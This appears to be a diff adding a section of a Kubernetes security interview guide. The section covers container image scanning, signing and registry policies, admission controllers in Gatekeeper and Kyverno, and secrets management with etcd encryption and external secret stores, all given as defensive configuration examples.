+# AWS ECR with scan on push:
+aws ecr put-image-scanning-configuration --repository-name my-app \
+  --image-scanning-configuration scanOnPush=true
+```
+
+Continuous scanning catches new CVEs in existing images.
+
+**Admission control for image policies:**
+
+**OPA Gatekeeper:**
+
+```yaml
+apiVersion: templates.gatekeeper.sh/v1beta1
+kind: ConstraintTemplate
+metadata:
+  name: k8sallowedrepos
+spec:
+  crd:
+    spec:
+      names:
+        kind: K8sAllowedRepos
+      validation:
+        openAPIV3Schema:
+          properties:
+            repos:
+              type: array
+              items:
+                type: string
+  targets:
+    - target: admission.k8s.gatekeeper.sh
+      rego: |
+        package k8sallowedrepos
+        
+        violation[{"msg": msg}] {
+          container := input.review.object.spec.containers[_]
+          satisfied := [good | repo = input.parameters.repos[_] ; good = startswith(container.image, repo)]
+          not any(satisfied)
+          msg := sprintf("container <%v> has an invalid image repo <%v>", [container.name, container.image])
+        }
+
+---
+apiVersion: constraints.gatekeeper.sh/v1beta1
+kind: K8sAllowedRepos
+metadata:
+  name: only-from-our-registry
+spec:
+  match:
+    kinds:
+      - apiGroups: [""]
+        kinds: ["Pod"]
+  parameters:
+    repos:
+      - "myregistry.example.com/"
+      - "gcr.io/google-containers/"
+```
+
+Only images from approved registries allowed.
+
+**Kyverno:**
+
+```yaml
+apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata:
+  name: check-image-registry
+spec:
+  validationFailureAction: enforce
+  rules:
+    - name: check-registry
+      match:
+        any:
+          - resources:
+              kinds: [Pod]
+      validate:
+        message: "Image must come from approved registry"
+        pattern:
+          spec:
+            containers:
+              - image: "myregistry.example.com/*"
+```
+
+Simpler syntax than Gatekeeper.
+
+**Image signing with Cosign:**
+
+```bash
+# Sign image:
+cosign sign --key cosign.key myregistry.com/my-app:v1
+
+# Verify:
+cosign verify --key cosign.pub myregistry.com/my-app:v1
+```
+
+Admission control checks signatures:
+
+```yaml
+# Kyverno:
+apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata:
+  name: verify-image-signatures
+spec:
+  validationFailureAction: enforce
+  rules:
+    - name: check-signature
+      match:
+        any:
+          - resources:
+              kinds: [Pod]
+      verifyImages:
+        - imageReferences:
+            - "myregistry.example.com/*"
+          attestors:
+            - count: 1
+              entries:
+                - keys:
+                    publicKeys: |-
+                      -----BEGIN PUBLIC KEY-----
+                      ...
+                      -----END PUBLIC KEY-----
+```
+
+Unsigned or untrusted images rejected.
+
+**Image immutability:**
+
+Use digests, not tags:
+
+```yaml
+# Mutable (bad):
+image: my-app:latest
+
+# Or:
+image: my-app:v1   # Tag can be reassigned
+
+# Immutable (good):
+image: my-app@sha256:abc123def456...
+```
+
+Tags can be rewritten; digests can't. Digest pinning ensures exact image.
+
+**Allowed registries policy:**
+
+```yaml
+# Approved registries only:
+- myregistry.example.com (internal)
+- gcr.io/google-containers (Kubernetes)
+- registry.k8s.io (Kubernetes)
+- public.ecr.aws (AWS public)
+```
+
+Block:
+- docker.io (anyone can push)
+- Random URLs
+- Unsigned sources
+
+**Minimal base images:**
+
+Smaller = fewer vulnerabilities:
+
+```dockerfile
+# Bad: bloated:
+FROM ubuntu:22.04
+# 78 MB, hundreds of packages
+
+# Better: minimal:
+FROM alpine:3.18
+# 5 MB, very few packages
+
+# Best: distroless:
+FROM gcr.io/distroless/static:nonroot
+# 2 MB, just runtime
+```
+
+Distroless has no shell, no package manager. Tiny attack surface.
+
+**Multi-stage builds:**
+
+Build tools not in final image:
+
+```dockerfile
+FROM golang:1.21 AS builder
+COPY . /src
+RUN cd /src && go build -o app
+
+FROM gcr.io/distroless/static
+COPY --from=builder /src/app /
+USER nonroot:nonroot
+CMD ["/app"]
+```
+
+Final image has only the binary. No Go toolchain, no build dependencies.
+
+**Pulling secrets:**
+
+```yaml
+# imagePullSecrets:
+spec:
+  imagePullSecrets:
+    - name: registry-credentials
+  containers:
+    - name: app
+      image: myregistry.com/my-app:v1
+```
+
+Authentication for private registries.
+
+For cloud: workload identity (IRSA, etc.) often works better than static pull secrets.
+
+**Continuous monitoring:**
+
+Scan running images:
+
+```bash
+# Get all running images:
+kubectl get pods --all-namespaces -o jsonpath='{.items[*].spec.containers[*].image}' | tr ' ' '\n' | sort -u
+
+# Scan each:
+for image in $(... ); do
+  trivy image --severity HIGH,CRITICAL $image
+done
+```
+
+Or use continuous scanning tools (Twistlock, Aqua, Snyk for K8s).
+
+**Image policy framework:**
+
+Comprehensive policy:
+
+```yaml
+# 1. Image must be from approved registry
+# 2. Image must be signed
+# 3. Image must have recent scan (< 7 days)
+# 4. Image must have no critical CVEs
+# 5. Image must use digest (not tag)
+```
+
+Implement via admission webhooks. Reject anything that doesn't pass all checks.
+
+**Build provenance:**
+
+SLSA (Supply-chain Levels for Software Artifacts):
+
+```bash
+# Sign with provenance:
+cosign attest --predicate provenance.json --key cosign.key my-app:v1
+
+# Verify provenance:
+cosign verify-attestation --key cosign.pub my-app:v1
+```
+
+Cryptographically verifiable build history.
+
+**Production scenarios:**
+
+1. **Scan in CI blocked critical CVE**: Build had log4shell vulnerability. Trivy in CI blocked. Image never deployed. Patched dependency, rebuilt.
+
+2. **Image immutability prevented rollback bug**: Always-pull policy with mutable tags. Someone retagged "v1" to point to broken image. All pods refreshed to broken. After: digest-based deploys.
+
+3. **OPA rejected DockerHub image**: Developer tried to deploy nginx:latest from Docker Hub. OPA Gatekeeper rejected. Only internal registry allowed. Educated team on policy.
+
+4. **Continuous scan caught Spring4Shell**: After Spring4Shell CVE published, registry scanner found existing images vulnerable. Patched immediately, didn't wait for next deployment.
+
+5. **Cosign signing enabled trust**: All production images signed in CI. Admission controllers verified. Unsigned images rejected. Build pipeline tampering impossible without key access.
+
+---
+
+## 228. Explain admission controller security use cases
+
+Admission controllers intercept requests to the API server after authentication and authorization but before persistence. They're the primary mechanism for policy enforcement.
+
+**Two types:**
+
+**Mutating admission controllers:**
+Modify the request before persistence. Examples:
+- Inject sidecars (Istio, service mesh)
+- Add labels/annotations
+- Set default resource limits
+
+**Validating admission controllers:**
+Approve or deny the request. Examples:
+- Pod Security Standards
+- Resource quota checks
+- Custom policies
+
+**Built-in admission controllers:**
+
+Kubernetes ships with many:
+- **AlwaysPullImages**: forces image pulls (security)
+- **DenyServiceExternalIPs**: prevents external IP services
+- **EventRateLimit**: limits event creation
+- **LimitRanger**: enforces resource limits
+- **NodeRestriction**: kubelet permissions
+- **PodNodeSelector**: forces node selectors
+- **ResourceQuota**: namespace quotas
+- **ServiceAccount**: auto-mounts SA tokens
+- **PodSecurity**: PSS enforcement
+
+**Dynamic admission controllers:**
+
+Custom logic via webhooks:
+
+```yaml
+apiVersion: admissionregistration.k8s.io/v1
+kind: ValidatingWebhookConfiguration
+metadata:
+  name: my-policy
+webhooks:
+  - name: policy.example.com
+    rules:
+      - apiGroups: [""]
+        apiVersions: ["v1"]
+        operations: ["CREATE", "UPDATE"]
+        resources: ["pods"]
+    clientConfig:
+      service:
+        namespace: policy-system
+        name: policy-webhook
+        path: "/validate"
+      caBundle: <base64-CA>
+    admissionReviewVersions: ["v1"]
+    sideEffects: None
+    failurePolicy: Fail
+```
+
+**Security use cases:**
+
+**Use case 1: Block privileged containers**
+
+```yaml
+# OPA Gatekeeper:
+apiVersion: constraints.gatekeeper.sh/v1beta1
+kind: K8sPSPPrivilegedContainer
+metadata:
+  name: psp-privileged
+spec:
+  match:
+    kinds:
+      - apiGroups: [""]
+        kinds: ["Pod"]
+```
+
+Rejects any pod with `privileged: true`.
+
+**Use case 2: Enforce labels**
+
+Require teams/cost-center labels:
+
+```yaml
+# Kyverno:
+apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata:
+  name: require-labels
+spec:
+  validationFailureAction: enforce
+  rules:
+    - name: check-labels
+      match:
+        any:
+          - resources:
+              kinds: [Deployment, Pod]
+      validate:
+        message: "Required labels: team, cost-center"
+        pattern:
+          metadata:
+            labels:
+              team: "?*"
+              cost-center: "?*"
+```
+
+Enforces tagging for cost allocation and ownership.
+
+**Use case 3: Image registry whitelist**
+
+```yaml
+# Only images from approved registries:
+apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata:
+  name: allowed-registries
+spec:
+  rules:
+    - name: check-registry
+      match:
+        any:
+          - resources:
+              kinds: [Pod]
+      validate:
+        message: "Image must be from approved registry"
+        pattern:
+          spec:
+            containers:
+              - image: "myregistry.com/* | gcr.io/google-containers/*"
+```
+
+**Use case 4: Force resource limits**
+
+```yaml
+apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata:
+  name: require-resources
+spec:
+  rules:
+    - name: validate-resources
+      match:
+        any:
+          - resources:
+              kinds: [Pod]
+      validate:
+        message: "Resource limits required"
+        pattern:
+          spec:
+            containers:
+              - resources:
+                  requests:
+                    memory: "?*"
+                    cpu: "?*"
+                  limits:
+                    memory: "?*"
+                    cpu: "?*"
+```
+
+No unlimited pods.
+
+**Use case 5: Verify image signatures**
+
+```yaml
+apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata:
+  name: verify-images
+spec:
+  rules:
+    - name: check-signature
+      match:
+        any:
+          - resources:
+              kinds: [Pod]
+      verifyImages:
+        - imageReferences:
+            - "myregistry.com/*"
+          attestors:
+            - entries:
+                - keys:
+                    publicKeys: |-
+                      -----BEGIN PUBLIC KEY-----
+                      ...
+                      -----END PUBLIC KEY-----
+```
+
+Only signed images allowed.
+
+**Use case 6: Mutate to add security context**
+
+Add security defaults to all pods:
+
+```yaml
+apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata:
+  name: add-security-context
+spec:
+  rules:
+    - name: mutate-pod
+      match:
+        any:
+          - resources:
+              kinds: [Pod]
+      mutate:
+        patchStrategicMerge:
+          spec:
+            securityContext:
+              runAsNonRoot: true
+              seccompProfile:
+                type: RuntimeDefault
+            containers:
+              - (name): "*"
+                securityContext:
+                  allowPrivilegeEscalation: false
+                  readOnlyRootFilesystem: true
+                  capabilities:
+                    drop: ["ALL"]
+```
+
+Auto-applies security context if not specified.
+
+**Use case 7: Inject sidecars**
+
+Istio's sidecar injection:
+
+```yaml
+# Mutating webhook that adds Envoy sidecar:
+apiVersion: admissionregistration.k8s.io/v1
+kind: MutatingWebhookConfiguration
+metadata:
+  name: istio-sidecar-injector
+webhooks:
+  - name: sidecar-injector.istio.io
+    namespaceSelector:
+      matchLabels:
+        istio-injection: enabled
+```
+
+Automatically adds proxy to pods in mesh-enabled namespaces.
+
+**Use case 8: Block deprecated APIs**
+
+```yaml
+apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata:
+  name: deprecated-apis
+spec:
+  rules:
+    - name: block-extensions-v1beta1
+      match:
+        any:
+          - resources:
+              apiVersions: ["extensions/v1beta1"]
+      validate:
+        message: "extensions/v1beta1 is deprecated, use apps/v1"
+        deny: {}
+```
+
+Prevents use of deprecated APIs before they're removed.
+
+**Use case 9: Enforce network policies**
+
+Require every namespace to have a NetworkPolicy:
+
+```yaml
+apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata:
+  name: require-networkpolicy
+spec:
+  rules:
+    - name: check-network-policy
+      match:
+        any:
+          - resources:
+              kinds: [Namespace]
+      generate:
+        kind: NetworkPolicy
+        name: default-deny
+        namespace: "{{request.object.metadata.name}}"
+        data:
+          spec:
+            podSelector: {}
+            policyTypes:
+              - Ingress
+              - Egress
+```
+
+Auto-creates default-deny on namespace creation.
+
+**Use case 10: Multi-tenant isolation**
+
+```yaml
+# Tenants can only deploy to their own namespace:
+apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata:
+  name: tenant-isolation
+spec:
+  rules:
+    - name: check-tenant
+      match:
+        any:
+          - resources:
+              kinds: [Pod, Deployment]
+      validate:
+        message: "Tenant must match namespace"
+        deny:
+          conditions:
+            any:
+              - key: "{{request.namespace}}"
+                operator: NotEquals
+                value: "{{request.object.metadata.labels.tenant}}-namespace"
+```
+
+**Comparison: OPA Gatekeeper vs Kyverno:**
+
+**OPA Gatekeeper:**
+
+Pros:
+- Powerful (full Rego language)
+- General-purpose policy engine
+- Used outside Kubernetes too
+
+Cons:
+- Rego learning curve
+- More complex syntax
+- Constraints + ConstraintTemplate split
+
+```yaml
+# Verbose syntax
+apiVersion: templates.gatekeeper.sh/v1beta1
+kind: ConstraintTemplate
+metadata:
+  name: k8srequiredlabels
+spec:
+  crd:
+    spec:
+      names:
+        kind: K8sRequiredLabels
+  targets:
+    - target: admission.k8s.gatekeeper.sh
+      rego: |
+        package k8srequiredlabels
+        violation[{"msg": msg}] {
+          required := input.parameters.labels
+          provided := input.review.object.metadata.labels
+          missing := required - provided
+          count(missing) > 0
+          msg := sprintf("missing required labels: %v", [missing])
+        }
+```
+
+**Kyverno:**
+
+Pros:
+- Kubernetes-native (YAML)
+- Easier learning curve
+- Image verification built-in
+- Generate, mutate, validate in one
+
+Cons:
+- Less powerful than Rego
+- Kubernetes-specific
+
+```yaml
+# Simpler:
+apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata:
+  name: require-labels
+spec:
+  rules:
+    - name: check-labels
+      validate:
+        pattern:
+          metadata:
+            labels:
+              app.kubernetes.io/name: "?*"
+```
+
+Most teams find Kyverno easier; advanced needs use Gatekeeper.
+
+**Failure policy:**
+
+```yaml
+webhooks:
+  - failurePolicy: Fail   # Or Ignore
+```
+
+**Fail:** if webhook unreachable, reject request (secure but can break API).
+
+**Ignore:** if webhook unreachable, allow request (open but resilient).
+
+For security policies: Fail. For optional features: Ignore.
+
+**Timeout:**
+
+```yaml
+webhooks:
+  - timeoutSeconds: 5   # Default 10s
+```
+
+Don't slow down API too much. Most policies should be fast (<1s).
+
+**Common pitfalls:**
+
+**Pitfall 1: Self-referential webhooks**
+
+Webhook checks pods, but is itself a pod. If webhook pod restarts, can't validate itself.
+
+Fix: namespaceSelector to exclude webhook's namespace.
+
+**Pitfall 2: Slow webhook**
+
+Webhook takes 5s per request. API server piles up requests.
+
+Fix: optimize webhook, scale webhook deployment.
+
+**Pitfall 3: Failure policy Fail with HA issues**
+
+If webhook unreachable, ALL pod operations blocked.
+
+Fix: HA webhook deployment, sometimes Ignore for non-critical.
+
+**Pitfall 4: Overly strict policies**
+
+Block legitimate operations. Developers frustrated.
+
+Fix: clear messages, audit before enforce, iterate.
+
+**Production scenarios:**
+
+1. **Gatekeeper blocked privileged pod**: New pod with privileged: true. Gatekeeper rejected with clear message. Developer didn't know they shouldn't. Education + fix.
+
+2. **Kyverno auto-injected security context**: Migrated from manual to Kyverno mutating policy. All pods auto-get safe defaults. Saved engineering time.
+
+3. **Image signing enforcement**: After supply chain incident, enforced signed images via admission. Builds had to add Cosign signing. Catches deployment of tampered images.
+
+4. **Webhook outage broke deployments**: Webhook deployment crashed. failurePolicy: Fail blocked all pod creation. Site went down because new pods couldn't roll. Lesson: HA webhook + careful failurePolicy choice.
+
+5. **Multi-tenant enforcement**: Cluster shared between teams. Policy ensured team labels match namespace, no cluster-admin access, resource limits set. Self-service worked safely.
+
+---
+
+## 229. How do you secure secrets management?
+
+Secrets in Kubernetes are notoriously poorly handled out of the box. Securing them requires multiple practices.
+
+**Out-of-the-box secrets:**
+
+```yaml
+apiVersion: v1
+kind: Secret
+metadata:
+  name: db-password
+type: Opaque
+data:
+  password: c3VwZXJzZWNyZXQ=   # base64, NOT encryption
+```
+
+Problems:
+- Base64 is encoding, not encryption
+- Stored in etcd (unencrypted by default)
+- Anyone with API access can read
+- No rotation
+- No audit trail
+
+**Layer 1: Encrypt etcd**
+
+The most important step. Configure encryption at rest:
+
+```yaml
+# EncryptionConfiguration:
+apiVersion: apiserver.config.k8s.io/v1
+kind: EncryptionConfiguration
+resources:
+  - resources:
+      - secrets
+    providers:
+      - aescbc:
+          keys:
+            - name: key1
+              secret: <32-byte base64 key>
+      - identity: {}   # Fallback for reading unencrypted
+```
+
+```yaml
+# kube-apiserver:
+--encryption-provider-config=/etc/kubernetes/encryption.yaml
+```
+
+Now secrets are encrypted in etcd. Without the key, etcd dumps are useless.
+
+Better: KMS provider:
+
+```yaml
+providers:
+  - kms:
+      name: cloud-kms
+      endpoint: unix:///var/run/kmsplugin/socket.sock
+      timeout: 3s
+      cachesize: 100
+```
+
+Encryption keys in cloud KMS (AWS KMS, GCP KMS, Vault). Key material never leaves KMS.
+
+**Layer 2: External secret stores**
+
+Best practice: don't store secrets in Kubernetes as source of truth.
+
+**External Secrets Operator (ESO):**
+
+```yaml
+apiVersion: external-secrets.io/v1beta1
+kind: ExternalSecret
+metadata:
+  name: db-credentials
+spec:
+  refreshInterval: 1h
+  secretStoreRef:
+    name: aws-secrets-manager
+    kind: ClusterSecretStore
+  target:
+    name: db-credentials
+    creationPolicy: Owner
+  data:
+    - secretKey: username
+      remoteRef:
+        key: prod/database/credentials
+        property: username
+    - secretKey: password
+      remoteRef:
+        key: prod/database/credentials
+        property: password
+```
+
+ESO pulls from AWS Secrets Manager, creates Kubernetes Secret. App uses normal Secret.
+
+Benefits:
+- Source of truth in dedicated system
+- Rotation in source propagates to K8s
+- Audit trail in source
+- Same secret across multiple clusters
+
+**Vault Secrets Operator:**
+
+```yaml
+apiVersion: secrets.hashicorp.com/v1beta1
+kind: VaultStaticSecret
+metadata:
+  name: db-creds
+spec:
+  type: kv-v2
+  mount: secret
+  path: db/creds
+  destination:
+    name: db-creds
+    create: true
+  refreshAfter: 30s
+```
+
+Pulls from HashiCorp Vault.
+
+**Layer 3: Sealed Secrets**
+
+For GitOps: encrypted secrets in Git:
+
+```yaml
+apiVersion: bitnami.com/v1alpha1
+kind: SealedSecret
+metadata:
+  name: mysecret
+spec:
+  encryptedData:
+    password: AgBy3i4OJSWK+PiTySYZZA9rO43cGDEq...
+```
+
+Sealed Secrets controller in cluster decrypts to regular Secret.
+
+Process:
+1. Create regular Secret locally
+2. Encrypt with cluster's public key:
+   ```bash
+   kubectl create secret generic mysecret --from-literal=password=secret \
+     --dry-run=client -o yaml | kubeseal -o yaml > sealed-secret.yaml
+   ```
+3. Commit `sealed-secret.yaml` to Git (safe)
+4. Apply to cluster
+
+Encryption tied to cluster's controller key. Different cluster can't decrypt.
+
+**Backup the controller's private key separately and securely.**
+
+**Layer 4: SOPS for GitOps**
+
+Encrypt specific values in YAML:
+
+```yaml
+# Original:
+db_password: supersecret
+
+# After SOPS:
+db_password: ENC[AES256_GCM,data:abc...,iv:def...]
+```
+
+```yaml
+# In CI/CD with SOPS key:
+sops --decrypt secrets.yaml | kubectl apply -f -
+```
+
+Encryption keys in KMS. SOPS decrypts during deploy.
+
+GitOps tools (Flux SOPS, ArgoCD plugins) handle automatically.
+
+**Layer 5: Cloud secret services**
+
+**AWS Secrets Manager:**
+
+```yaml
+# ESO + AWS SM:
+apiVersion: external-secrets.io/v1beta1
+kind: ClusterSecretStore
+metadata:
+  name: aws-secrets-manager
+spec:
+  provider:
+    aws:
+      service: SecretsManager
+      region: us-east-1
+      auth:
+        jwt:
+          serviceAccountRef:
+            name: external-secrets
+```
+
+**GCP Secret Manager:**
+
+Similar pattern with Workload Identity.
+
+**Azure Key Vault:**
+
+```yaml
+apiVersion: external-secrets.io/v1beta1
+kind: ClusterSecretStore
+spec:
+  provider:
+    azurekv:
+      vaultUrl: https://my-vault.vault.azure.net
+```
+
+**Layer 6: Pod-level secret consumption**
+
+How secrets reach applications:
+
+**Method 1: Environment variables**
+
+```yaml
+env:
+  - name: DB_PASSWORD
+    valueFrom:
+      secretKeyRef:
+        name: db-credentials
+        key: password
+```
+
+**Problems:**
+- Visible in pod spec (kubectl describe pod)
+- Can leak via child processes (env passes down)
+- In logs if app misbehaves
+
+**Method 2: Volume mounts**
+
+```yaml
+volumes:
+  - name: secrets
+    secret:
+      secretName: db-credentials
+containers:
+  - volumeMounts:
+      - name: secrets
+        mountPath: /etc/secrets
+        readOnly: true
+```
+
+App reads from `/etc/secrets/password`. Better:
+- Not in env (less leakage)
+- File permissions restrict
+- Easier to rotate (updated on next read)
+
+**Method 3: CSI driver (best for some cases)**
+
+Secrets Store CSI Driver:
+
+```yaml
+apiVersion: secrets-store.csi.x-k8s.io/v1
+kind: SecretProviderClass
+metadata:
+  name: vault-secrets
+spec:
+  provider: vault
+  parameters:
+    vaultAddress: "http://vault:8200"
+    objects: |
+      - objectName: "db-password"
+        secretPath: "secret/data/db"
+        secretKey: "password"
+
+---
+apiVersion: v1
+kind: Pod
+spec:
+  containers:
+    - volumeMounts:
+        - name: secrets-store
+          mountPath: /mnt/secrets
+          readOnly: true
+  volumes:
+    - name: secrets-store
+      csi:
+        driver: secrets-store.csi.k8s.io
+        readOnly: true
+        volumeAttributes:
+          secretProviderClass: "vault-secrets"
+```
+
+Secrets pulled directly from external store. Never stored in Kubernetes Secret.
+
+**Layer 7: Rotation**
+
+Secrets should rotate regularly:
+
+```yaml
+# AWS Secrets Manager auto-rotation:
+{
+  "RotationLambdaARN": "arn:...",
+  "RotationRules": {
+    "AutomaticallyAfterDays": 30
+  }
+}
+```
+
+ESO picks up rotated values:
+
+```yaml
+spec:
+  refreshInterval: 1h   # Check for updates hourly
+```
+
+When secret rotates in source, ESO updates K8s Secret, app re-reads.
+
+**App-side considerations:**
+
+Apps must:
+- Re-read secrets periodically (or watch for updates)
+- Handle credential rotation gracefully
+- Not cache credentials forever
+
+**Layer 8: Audit and access control**
+
+**RBAC for secrets:**
+
+```yaml
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: db-secret-reader
+rules:
+  - apiGroups: [""]
+    resources: ["secrets"]
+    resourceNames: ["db-credentials"]
+    verbs: ["get"]
+```
+
+Specific service account, specific secret.
+
+**Audit logging:**
+
+```yaml
+# audit-policy:
+- level: RequestResponse
+  resources:
+    - group: ""
+      resources: ["secrets"]
+```
+
+Logs every secret access.
+
+**Common mistakes:**
+
+**Mistake 1: Secrets in env shown in describe**
+
+```bash
+kubectl describe pod my-pod
+# Shows:
+# DB_PASSWORD:  <set to the key 'password' in secret 'db-credentials'>
+```
+
+Not the value but the reference. Still, indicates where secret is.
+
+**Mistake 2: Same secret for everyone**
+
+One secret used across many apps. Compromise of any = all compromised.
+
+Fix: per-app secrets.
+
+**Mistake 3: Secrets in Git**
+
+Even base64-encoded "secrets" are not encrypted. Don't commit Kubernetes Secret YAML.
+
+Fix: Sealed Secrets, SOPS, or external references.
+
+**Mistake 4: Long-lived secrets**
+
+Same password for years. If leaked at any point, long exposure.
+
+Fix: rotation.
+
+**Mistake 5: No backup of key material**
+
+Sealed Secrets controller key lost = secrets unrecoverable.
+
+Fix: backup keys (encrypted, offsite).
+
+**Production scenarios:**
+
+1. **Encrypted etcd saved data**: etcd backup leaked. All secrets would have been exposed in plaintext. Encryption at rest meant the backup was useless without the key.
+
+2. **ESO + AWS Secrets Manager**: Migrated from K8s Secrets to ESO. Single source of truth. Rotation via SM auto-rotation. Apps unchanged.
+
+3. **Sealed Secrets for GitOps**: Argo CD reconciled from Git. Sealed Secrets allowed encrypted secrets in Git. Different keys per environment.
+
+4. **CSI driver for high security**: Compliance required secrets never in K8s. CSI driver pulled from Vault directly. No K8s Secret created.
+
+5. **Rotation broke applications**: Database rotated, K8s Secret updated, but apps had cached old credentials forever. Updated apps to re-read periodically. Smooth rotation thereafter.
+
+---
+
+## 230. Explain external secret managers integration
+
+External secret managers separate secret storage from Kubernetes, providing better security, auditing, and rotation capabilities.
+
+**Why external:**
+
+- **Specialized**: built for secrets, more features than K8s Secrets
+- **Audited**: detailed access logs
+- **Rotated**: automatic credential rotation
+- **Shared**: same secret across multiple clusters/regions
+- **Compliance**: meets standards (PCI, HIPAA, SOC 2)
+
+**Common external secret managers:**
+
+- **HashiCorp Vault**: self-hosted or HCP, very feature-rich
+- **AWS Secrets Manager**: AWS-native, well-integrated
+- **GCP Secret Manager**: GCP-native
+- **Azure Key Vault**: Azure-native
+- **CyberArk Conjur**: enterprise-focused
+- **AWS Parameter Store**: simpler, cheaper alternative to SM
+
+**Integration approaches:**
+
+**Approach 1: External Secrets Operator (ESO)**
+
+Most popular generic integration. Supports many backends.
+
+```yaml
+# Install:
+helm install external-secrets external-secrets/external-secrets -n external-secrets-system
+```
+
+**Configure SecretStore (or ClusterSecretStore):**
+
+```yaml
+apiVersion: external-secrets.io/v1beta1
+kind: ClusterSecretStore
+metadata:
+  name: aws-secrets-manager
+spec:
+  provider:
+    aws:
+      service: SecretsManager
+      region: us-east-1
+      auth:
+        jwt:
+          serviceAccountRef:
+            name: external-secrets
+            namespace: external-secrets-system
+```
+
+**Create ExternalSecret:**
+
+```yaml
+apiVersion: external-secrets.io/v1beta1
+kind: ExternalSecret
+metadata:
+  name: db-credentials
+  namespace: production
+spec:
+  refreshInterval: 1h
+  secretStoreRef:
+    name: aws-secrets-manager
+    kind: ClusterSecretStore
+  target:
+    name: db-credentials
+    creationPolicy: Owner
+  data:
+    - secretKey: username
+      remoteRef:
+        key: prod/database
+        property: username
+    - secretKey: password
+      remoteRef:
+        key: prod/database
+        property: password
+```
+
+ESO creates a Kubernetes Secret `db-credentials` with values from AWS Secrets Manager. Refreshes every hour.
+
+**Pod uses normal Secret:**
+
+```yaml
+spec:
+  containers:
+    - env:
+        - name: DB_PASSWORD
+          valueFrom:
+            secretKeyRef:
+              name: db-credentials
+              key: password
+```
+
+App doesn't know secrets came from external.
+
+**Approach 2: Secrets Store CSI Driver**
+
+Secrets mounted directly from external store, never stored in K8s Secret:
+
+```yaml
+apiVersion: secrets-store.csi.x-k8s.io/v1
+kind: SecretProviderClass
+metadata:
+  name: aws-secrets
+spec:
+  provider: aws
+  parameters:
+    objects: |
+      - objectName: prod/database
+        objectType: secretsmanager
+        jmesPath:
+          - path: username
+            objectAlias: db-username
+          - path: password
+            objectAlias: db-password
+```
+
+**Pod mounts CSI volume:**
+
+```yaml
+spec:
+  serviceAccountName: my-app
+  containers:
+    - volumeMounts:
+        - name: secrets-store
+          mountPath: /mnt/secrets
+          readOnly: true
+  volumes:
+    - name: secrets-store
+      csi:
+        driver: secrets-store.csi.k8s.io
+        readOnly: true
+        volumeAttributes:
+          secretProviderClass: aws-secrets
+```
+
+Files appear at `/mnt/secrets/db-username` and `/mnt/secrets/db-password`.
+
+Optional: sync to K8s Secret (if you need env var injection):
+
+```yaml
+spec:
+  secretObjects:
+    - secretName: db-credentials
+      type: Opaque
+      data:
+        - objectName: db-username
+          key: username
+        - objectName: db-password
+          key: password
+```
+
+**Approach 3: Vault Agent Injector**
+
+Vault-specific. Sidecar injects secrets:
+
+```yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: my-app
+spec:
+  template:
+    metadata:
+      annotations:
+        vault.hashicorp.com/agent-inject: "true"
+        vault.hashicorp.com/role: "my-app"
+        vault.hashicorp.com/agent-inject-secret-db-creds: "secret/data/db"
+        vault.hashicorp.com/agent-inject-template-db-creds: |
+          {{- with secret "secret/data/db" -}}
+          export DB_USER={{ .Data.data.username }}
+          export DB_PASSWORD={{ .Data.data.password }}
+          {{- end }}
+```
+
+Vault sidecar:
+1. Authenticates to Vault using SA
+2. Fetches secrets
+3. Writes to shared volume
+4. App sources file or reads file
+
+Auto-refreshes when secrets change.
+
+**Authentication to external store:**
+
+External store needs to know who's asking. Common methods:
+
+**Method 1: Cloud IAM (IRSA, Workload Identity)**
+
+```yaml
+# Service account with AWS IAM role:
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: external-secrets
+  annotations:
+    eks.amazonaws.com/role-arn: arn:aws:iam::123:role/external-secrets-role
+```
+
+The role has permission to read specific secrets. ESO uses pod's identity to access AWS.
+
+Benefits:
+- No long-lived credentials
+- Automatic rotation
+- Tied to Kubernetes SA
+
+**Method 2: Vault Kubernetes auth**
+
+```bash
+# Vault config:
+vault auth enable kubernetes
+vault write auth/kubernetes/config \
+  kubernetes_host=https://kubernetes.default.svc \
+  ...
+```
+
+Vault verifies SA tokens, maps to Vault roles:
+
+```bash
+vault write auth/kubernetes/role/my-app \
+  bound_service_account_names=my-app \
+  bound_service_account_namespaces=production \
+  policies=my-app-policy
+```
+
+App's SA token = Vault auth.
+
+**Method 3: Static credentials (avoid)**
+
+Store credentials in K8s Secret to access external store. Circular but sometimes necessary:
+
+```yaml
+apiVersion: external-secrets.io/v1beta1
+kind: ClusterSecretStore
+spec:
+  provider:
+    aws:
+      auth:
+        secretRef:
+          accessKeyIDSecretRef:
+            name: aws-creds
+            key: access-key
+```
+
+Bootstrap problem: how to get the credentials in?
+
+Better to use cloud IAM (no static creds).
+
+**Patterns:**
+
+**Pattern 1: ESO for application config**
+
+```
+External Store (Vault) → ESO → K8s Secret → Pod
+```
+
+Easy migration from existing K8s Secrets. App unchanged.
+
+**Pattern 2: CSI driver for sensitive data**
+
+```
+External Store → CSI Driver → File mount → App
+```
+
+Never in K8s Secret. Best for highly sensitive data.
+
+**Pattern 3: Vault Agent for dynamic credentials**
+
+```
+Vault generates DB creds per app
+Vault Agent injects, renews
+App uses ephemeral creds
+```
+
+Database credentials never long-lived.
+
+**Pattern 4: Multi-region replication**
+
+```
+AWS Secrets Manager primary in us-east-1
+Replicated to us-west-2
+ESO in DR cluster reads from replica
+```
+
+Cross-region availability of secrets.
+
+**Pattern 5: Secret rotation**
+
+```
+1. AWS SM rotates DB password (automatic, 30 days)
+2. ESO detects change (refresh interval)
+3. ESO updates K8s Secret
+4. App re-reads (file or restart)
+5. New password in use
+```
+
+Automated end-to-end.
+
+**Comparing approaches:**
+
+| Aspect | ESO | CSI Driver | Vault Agent |
+|--------|-----|-----------|-------------|
+| Backends | Many | Many | Vault only |
+| Secret in K8s | Yes | Optional | No |
+| App changes | None | None or read from file | None or read from file |
+| Refresh | Periodic | On-demand | Auto |
+| Complexity | Low | Medium | Medium |
